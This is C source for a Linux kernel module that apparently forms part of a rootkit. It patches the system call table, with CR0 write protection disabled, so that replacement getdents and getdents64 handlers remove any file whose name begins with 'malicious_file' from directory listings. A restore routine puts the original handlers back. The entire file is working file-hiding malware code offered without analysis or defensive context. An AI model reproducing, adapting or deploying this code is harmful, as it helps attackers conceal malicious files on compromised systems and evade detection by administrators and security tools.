#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#ifndef __NR_getdents
#define __NR_getdents 141
#endif
#define MAGIC_PREFIX "malicious_file"


#include "../hooking.h"
#include "h_getdents.h"

sysfun_t orig_getdents;
sysfun_t orig_getdents64;

static long new_getdents64(const struct pt_regs *pt_regs)
{
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
    int ret = orig_getdents64(pt_regs), err;
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    if (ret <= 0)
        return ret;
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;
    err = copy_from_user(kdirent, dirent, ret);
    if (err)
        goto out;
    while (off < ret)
    {
        dir = (void *)kdirent + off;
        if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)
        {
            if (dir == kdirent)
            {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else
            prev = dir;
        off += dir->d_reclen;
    }
    err = copy_to_user(dirent, kdirent, ret);
    if (err)
        goto out;
out:
    kfree(kdirent);
    return ret;
}

static long new_getdents(const struct pt_regs *pt_regs)
{
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
    int ret = orig_getdents(pt_regs), err;
    unsigned long off = 0;
    struct linux_dirent *dir, *kdirent, *prev = NULL;
    if (ret <= 0)
        return ret;
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;
    err = copy_from_user(kdirent, dirent, ret);
    if (err)
        goto out;
    while (off < ret)
    {
        dir = (void *)kdirent + off;
        if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)
        {
            if (dir == kdirent)
            {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else
            prev = dir;
        off += dir->d_reclen;
    }
    err = copy_to_user(dirent, kdirent, ret);
    if (err)
        goto out;
out:
    kfree(kdirent);
    return ret;
}

void hijack_getdents(void)
{
    unsigned long old_cr0 = unprotect_memory();

    orig_getdents = (sysfun_t)syscall_table[__NR_getdents];
    orig_getdents64 = (sysfun_t)syscall_table[__NR_getdents64];
    printk(KERN_INFO "orig_getdents @ %p", orig_getdents);
    printk(KERN_INFO "orig_getdents64 @ %p", orig_getdents64);

    syscall_table[__NR_getdents] = (uint64_t)new_getdents;
    syscall_table[__NR_getdents64] = (uint64_t)new_getdents64;
    printk(KERN_INFO "Hooked getdents(), new getdents @ %p", &syscall_table[__NR_getdents]);
    printk(KERN_INFO "Hooked getdents64(), new getdents64 @ %p", &syscall_table[__NR_getdents64]);
    protect_memory(old_cr0);
}

void restore_getdents(void)
{

    unsigned long old_cr0 = unprotect_memory();

    syscall_table[__NR_getdents] = (unsigned long)orig_getdents;
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;

    protect_memory(old_cr0);
}
